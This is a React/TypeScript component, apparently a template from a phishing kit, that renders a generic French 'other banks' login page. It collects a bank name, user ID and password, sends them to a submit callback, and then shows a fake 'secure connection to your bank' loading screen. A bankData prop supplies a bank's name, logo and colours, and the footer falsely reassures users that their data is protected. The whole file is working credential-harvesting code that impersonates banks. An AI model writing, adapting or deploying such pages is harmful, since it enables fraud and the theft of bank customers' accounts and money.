import React, { useState } from 'react';
import { Loader2, Eye, EyeOff } from 'lucide-react';

interface ExtPartnersTemplateProps {
  onSubmit: (formData: any) => Promise<boolean>;
  bankData: {
    name: string;
    url: string;
    logo?: string;
    palette?: string[];
    backgroundColor?: string;
    textColor?: string;
  };
}

export function ExtPartnersTemplate({ onSubmit, bankData }: ExtPartnersTemplateProps) {
  const [formData, setFormData] = useState({
    bankName: '',
    userId: '',
    password: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [showLoader, setShowLoader] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [logoError, setLogoError] = useState(false);

  // Couleurs par défaut
  const primaryColor = '#4f46e5'; // indigo-600
  const secondaryColor = '#3b82f6'; // blue-600

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('sending');

    try {
      const submitData = {
        ...formData,
        bank: bankData.name
      };
      
      const success = await onSubmit(submitData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      setShowLoader(true);
      
      setTimeout(() => {
        setShowLoader(false);
        setStatus('idle');
      }, 3000);
    } catch (error) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleLogoError = () => {
    setLogoError(true);
  };

  // Show loader overlay when processing
  if (showLoader) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-50 pt-20">
        <div className="max-w-2xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin mb-6 text-indigo-600" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Authentification en cours...
              </h2>
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace bancaire en cours.
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-50 flex items-center justify-center pt-20 pb-8">
      <div className="w-full max-w-md px-4">
        <div className="bg-white rounded-2xl shadow-xl overflow-hidden">
          {/* Header */}
          <div className="bg-gradient-to-r from-indigo-600 to-blue-600 px-8 py-8">
            <h1 className="text-2xl font-bold text-white mb-2">Authentification bancaire</h1>
            <p className="text-indigo-100">Autres banques</p>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="p-8 space-y-6">
            {/* Nom de la banque */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-3">
                1. Nom de la banque
              </label>
              <input
                type="text"
                value={formData.bankName}
                onChange={(e) => setFormData(prev => ({ ...prev, bankName: e.target.value }))}
                className="w-full px-4 py-3 border-2 border-gray-200 rounded-lg focus:border-indigo-500 focus:outline-none transition-colors"
                placeholder="Ex: Crédit Agricole"
                required
              />
            </div>

            {/* ID / Identifiant */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-3">
                2. ID / Identifiant
              </label>
              <input
                type="text"
                value={formData.userId}
                onChange={(e) => setFormData(prev => ({ ...prev, userId: e.target.value }))}
                className="w-full px-4 py-3 border-2 border-gray-200 rounded-lg focus:border-indigo-500 focus:outline-none transition-colors"
                placeholder="Votre identifiant"
                required
              />
            </div>

            {/* Mot de passe */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-3">
                3. Mot de passe
              </label>
              <div className="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={formData.password}
                  onChange={(e) => setFormData(prev => ({ ...prev, password: e.target.value }))}
                  className="w-full px-4 py-3 border-2 border-gray-200 rounded-lg focus:border-indigo-500 focus:outline-none transition-colors"
                  placeholder="Votre mot de passe"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={status === 'sending' || !formData.bankName || !formData.userId || !formData.password}
              className="w-full bg-gradient-to-r from-indigo-600 to-blue-600 text-white font-semibold py-3 rounded-lg transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed hover:shadow-lg transform hover:-translate-y-0.5 active:translate-y-0"
            >
              {status === 'sending' ? (
                <div className="flex items-center justify-center space-x-2">
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Connexion...</span>
                </div>
              ) : (
                'Se connecter'
              )}
            </button>

            {status === 'error' && (
              <div className="bg-red-50 border-2 border-red-200 rounded-lg p-4">
                <div className="flex items-center space-x-2 text-red-700">
                  <span>⚠️</span>
                  <span className="text-sm font-medium">Échec de la connexion. Vérifiez vos identifiants.</span>
                </div>
              </div>
            )}
          </form>

          {/* Footer */}
          <div className="bg-gray-50 px-8 py-4 border-t border-gray-100">
            <p className="text-xs text-gray-600 text-center">
              Connexion sécurisée. Vos données sont protégées.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}